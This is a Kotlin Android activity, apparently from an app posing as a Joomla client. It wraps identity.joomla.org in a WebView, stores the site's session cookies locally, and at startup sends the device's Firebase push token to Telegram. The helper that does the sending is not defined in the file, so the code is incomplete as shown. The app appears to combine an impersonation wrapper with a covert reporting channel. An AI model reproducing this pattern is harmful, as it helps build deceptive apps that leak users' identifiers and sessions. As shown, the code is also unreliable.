package org.Joomla

import android.annotation.SuppressLint
import android.os.Bundle
import android.webkit.CookieManager
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import android.content.Context
import android.util.Log
import com.google.firebase.messaging.FirebaseMessaging

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private val siteUrl = "https://identity.joomla.org"

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        FirebaseMessaging.getInstance().token
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    val token = task.result
                    Log.d("FCM Token", token)
                    sendTokenToTelegram(token)
                } else {
                    Log.e("FCM Token", "Ошибка получения токена", task.exception)
                }
            }

        // Создание WebView
        webView = WebView(this)
        setContentView(webView)

        val webSettings = webView.settings
        webSettings.javaScriptEnabled = true

        // Поддержка куки
        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)

        // Загрузка куки
        restoreCookies()

        // Перехватываем загрузки страниц
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(
                view: WebView,
                request: WebResourceRequest
            ): Boolean {
                return false
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)

                // Сохраняем куки
                saveCookies(url)
            }
        }

        // Загружаем сайт
        webView.loadUrl(siteUrl)
    }

    // Сохраняем куки в SharedPreferences
    private fun saveCookies(url: String?) {
        if (url == null) return
        val cookieManager = CookieManager.getInstance()
        val cookies = cookieManager.getCookie(url)

        val prefs = getSharedPreferences("cookie_prefs", Context.MODE_PRIVATE)
        prefs.edit().putString("cookies", cookies).apply()
    }

    // Восстанавливаем куки в CookieManager из SharedPreferences
    private fun restoreCookies() {
        val prefs = getSharedPreferences("cookie_prefs", Context.MODE_PRIVATE)
        val cookies = prefs.getString("cookies", null)

        if (cookies != null) {
            val cookieManager = CookieManager.getInstance()
            val cookieParts = cookies.split(";")
            for (cookie in cookieParts) {
                cookieManager.setCookie(siteUrl, cookie.trim())
            }

            // Синхронизируем куки в WebView
            cookieManager.flush()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Очищаем WebView
        webView.destroy()
    }
}
